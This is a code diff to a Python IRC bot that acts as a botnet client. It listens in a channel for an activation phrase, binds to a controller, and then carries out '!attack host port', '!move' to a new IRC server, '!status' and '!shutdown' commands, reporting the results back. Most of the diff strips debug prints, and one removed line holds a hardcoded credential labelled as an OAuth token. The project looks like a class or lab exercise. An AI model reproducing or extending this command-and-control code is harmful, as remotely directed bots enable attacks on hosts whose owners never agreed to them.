@@ -6,11 +6,8 @@ import sys
 import signal
 import os
 
-#HOST = ""              # the Twitch IRC server
-#PORT = 1234                         # always use port 6667!
-NICK = "testBot"            # your Twitch username, lowercase
-PASS = "pwiscpsc1234" # your Twitch OAuth token
-#CHAN = "testg"                   # the channel you want to join
+
+NICK = "testBot"            
 
 errorList = [ "402","403","431","432",'433',"436","437","461","465","471","473","474","475"]
 
@@ -50,10 +47,8 @@ class clientBot(object):
             s.send("USER {} {} {} {}:Test\n".format(self.NICK,self.NICK,self.NICK,self.NICK).encode("utf-8"))
             s.send("NICK {}\r\n".format(self.NICK).encode("utf-8"))
             s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
-            time.sleep(5)
-            s.send("PRIVMSG {} : {}\r\n".format(self.controller,"!MOVE! move successful").encode("utf-8"))
         except Exception as e:
-            s.send("PRIVMSG {} : {}\r\n".format(self.controller,"!MOVE! move unsuccessful").encode("utf-8"))
+            print(e)           
             
     def attack(self, h, p):
         try:
@@ -64,7 +59,7 @@ class clientBot(object):
             self.counter = self.counter + 1
             self.s.send("PRIVMSG {} : !ATTACK! attack was successful\r\n".format(self.controller).encode("utf-8"))
         except Exception as e:
-            self.s.send("PRIVMSG {} : !ATTACK! attack was unsucccessful\r\n".format(self.controller).encode("utf-8"))
+            self.s.send("PRIVMSG {} : !ATTACK! attack was unsuccessful\r\n".format(self.controller).encode("utf-8"))
             
             
     def move(self, host, port, chan):
@@ -72,21 +67,18 @@ class clientBot(object):
         self.port = int(port)
         self.chan = chan
         self.s.shutdown(socket.SHUT_RDWR)
-        self.s.close()
-        print("line 52")
-        print(self.host)
-        print(self.port)
+        self.s.close()        
         self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.connect((self.host,self.port))
         self.moveIRC(self.s,self.chan)
         
     def setController(self, prefix):
-        arguments = prefix.split("!~")
+        arguments = prefix.split("!")
         self.controller = arguments[0]
             
     def parseController(self,prefix):
-        arguments = prefix.split("!~")
+        arguments = prefix.split("!")
         return arguments[0]
 
 def main():    
@@ -122,19 +114,15 @@ def connection():
     cBot.connectIRC(cBot.s,cBot.NICK,cBot.chan)
     cBot.activationPhrase = PHRASE
    
-    print("Connected to IRC...")
+    print("Connecting to IRC...")
     
     try:
         while True:
-            response = cBot.s.recv(1024).decode("utf-8")
-            print("response: ")
-            print(response)
+            response = cBot.s.recv(1024).decode("utf-8")            
             (prefix, command, args)= parsemsg(response)            
             for p in args:
                 if(":Nickname is already in use" in p):
                     cBot.connectIRC(cBot.s,cBot.NICK,cBot.chan)                
-                print ("arg["+p.strip()+"]")
-            print((prefix,command,args))
             if command == "PRIVMSG":
                     test = args[1].split()
                     if args[0] == cBot.chan and args[1].split()[0] == cBot.activationPhrase:
@@ -143,7 +131,7 @@ def connection():
                         print("GameON")
                         print(cBot.controller)
                     if args[0] == cBot.chan and args[1].split()[0] == "!status":
-                        if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):
+                        if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):                          
                             cBot.s.send("PRIVMSG {} : {} {}\r\n".format(cBot.controller,"!STATUS!", cBot.NICK).encode("utf-8"))
                     if args[0] == cBot.chan and args[1].split()[0] == "!attack":
                         if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):
@@ -152,29 +140,22 @@ def connection():
                             cBot.attack(attackhost,attackPort)                    
                     if args[0] == cBot.chan and args[1].split()[0] == "!move":
                         if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):
+                            cBot.s.send("PRIVMSG {} : {} {} {}\r\n".format(cBot.controller,"!MOVE!", cBot.NICK, "pz out").encode("utf-8"))
                             cBot.s.send("QUIT : pz out\r\n".encode("utf-8"))
                             newHost = args[1].split()[1].strip()
                             newPort = args[1].split()[2].strip()
-                            newChan = args[1].split()[3].strip()
-                            print("line 148: " + newChan)
+                            newChan = args[1].split()[3].strip()                            
                             cBot.move(newHost,newPort,newChan)
                     if args[0] == cBot.chan and args[1].split()[0] == "!shutdown":
                         if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):
                             cBot.s.send("PRIVMSG {} : {} {}\r\n".format(cBot.controller, "!SHUTDOWN!", "shutdown i'm out").encode("utf-8"))
-                            #cBot.s.send("QUIT : {}\r\n".format("pz im out"))
-                            #cBot.s.send(signal.SIGINT)
-                            #cBot.s.send(signal.SIGINT)
-                            #cBot.s.send("KILL {} : {}".format(cBot.NICK,"because").encode("utf-8"))
                             cBot.s.send('\x03'.encode("utf-8"))
-                            sys.exit(signal.SIGTERM)
-                        
+                            sys.exit(signal.SIGTERM)                        
             elif command == "KICK" :
                 cBot.connectIRC(cBot.s,cBot.NICK, cBot.chan)                              
             elif command == "PING":
-                cBot.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))            
-                
-            elif command =='433':
-                print("line 161")
+                cBot.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))      
+            elif command =='433':                
                 cBot.createNick(NICK)
                 cBot.connectIRC(cBot.s,cBot.NICK, cBot.chan)        
     except Exception as e:
